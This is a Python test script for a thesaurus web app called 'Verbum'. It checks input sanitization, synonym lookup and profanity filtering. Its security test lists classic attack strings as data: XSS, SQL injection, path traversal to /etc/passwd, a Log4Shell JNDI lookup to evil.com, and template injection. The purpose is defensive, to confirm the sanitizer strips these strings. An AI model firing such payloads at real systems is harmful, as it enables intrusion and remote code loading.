#!/usr/bin/env python3
"""
Test script for Verbum Thesaurus App
Tests the core functionality and security features.
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from app import sanitize_input, get_synonyms

def test_sanitization():
    """Test input sanitization function."""
    print("🧪 Testing input sanitization...")
    
    # Valid inputs
    assert sanitize_input("hello") == "hello"
    assert sanitize_input("Hello") == "hello" 
    assert sanitize_input("co-worker") == "co-worker"
    assert sanitize_input("don't") == "don't"
    
    # Invalid inputs
    assert sanitize_input("hello<script>") == "helloscript"
    assert sanitize_input("hello; DROP TABLE") == "hellodroptable"
    assert sanitize_input("hello123") == "hello"
    assert sanitize_input("") is None
    assert sanitize_input("a" * 51) is None  # Too long
    assert sanitize_input(None) is None
    assert sanitize_input(123) is None
    
    # Test profanity filtering (behavior depends on environment setting)
    # Note: The profanity filter can be enabled/disabled via ENABLE_PROFANITY_FILTER env var
    from app import ENABLE_PROFANITY_FILTER
    if ENABLE_PROFANITY_FILTER:
        assert sanitize_input("shit") is None  # Should be blocked by profanity filter
        print("  - Profanity filter is ENABLED")
    else:
        # When disabled, profanity words pass through sanitization (but may not have synonyms)
        result = sanitize_input("shit")
        print(f"  - Profanity filter is DISABLED, profane word → {result}")
    
    assert sanitize_input("asdfghjkl") == "asdfghjkl"  # Nonsense but not profanity
    
    print("✓ Input sanitization and profanity filtering tests passed!")

def test_synonyms():
    """Test synonym lookup functionality."""
    print("🧪 Testing synonym lookup...")
    
    # Test with common words
    result = get_synonyms("happy")
    assert isinstance(result, dict)
    assert 'synonyms' in result
    assert 'definition' in result
    assert isinstance(result['synonyms'], list)
    assert len(result['synonyms']) > 0
    assert isinstance(result['definition'], str)
    print(f"Found {len(result['synonyms'])} synonyms for 'happy': {result['synonyms'][:5]}...")
    print(f"Definition: {result['definition'][:50]}..." if result['definition'] else "No definition found")
    
    result = get_synonyms("big")
    assert isinstance(result, dict)
    assert len(result['synonyms']) > 0
    print(f"Found {len(result['synonyms'])} synonyms for 'big': {result['synonyms'][:5]}...")
    
    # Test with non-existent word
    result = get_synonyms("xyzabc123notaword")
    assert isinstance(result, dict)
    assert len(result['synonyms']) == 0
    
    print("✓ Synonym lookup tests passed!")

def test_security():
    """Test security features."""
    print("🧪 Testing security features...")
    
    # Test malicious inputs
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "%3Cscript%3Ealert('xss')%3C/script%3E"
    ]
    
    for malicious in malicious_inputs:
        sanitized = sanitize_input(malicious)
        # Should either be None or contain only safe characters
        if sanitized:
            assert all(c.isalpha() or c in "-'" for c in sanitized)
        print(f"✓ Blocked malicious input: {malicious[:20]}...")
    
    print("✓ Security tests passed!")

def test_api_profanity_blocking():
    """Test that the API handles profanity based on configuration."""
    print("🧪 Testing API profanity handling...")
    
    from app import app, ENABLE_PROFANITY_FILTER
    
    with app.test_client() as client:
        if ENABLE_PROFANITY_FILTER:
            # Test profanity blocking when filter is enabled
            response = client.post('/api/synonyms', 
                                 json={'word': 'damn'},
                                 content_type='application/json')
            # Note: 'damn' might pass through as it's a legitimate dictionary word
            print(f"  - Filter enabled: 'damn' response code: {response.status_code}")
        else:
            print("  - Profanity filter is disabled, all words pass through sanitization")
        
        # Test that clean words always work
        response = client.post('/api/synonyms', 
                             json={'word': 'happy'},
                             content_type='application/json')
        assert response.status_code == 200
        data = response.get_json()
        assert 'synonyms' in data
        
    print("✓ API profanity handling tests passed!")

if __name__ == '__main__':
    print("🔬 Running Verbum Tests...")
    print("=" * 50)
    
    try:
        test_sanitization()
        test_synonyms()
        test_security()
        test_api_profanity_blocking()
        
        print("=" * 50)
        print("✅ All tests passed! Verbum is ready to use.")
        
    except Exception as e:
        print(f"✗ Test failed: {e}")
        sys.exit(1)
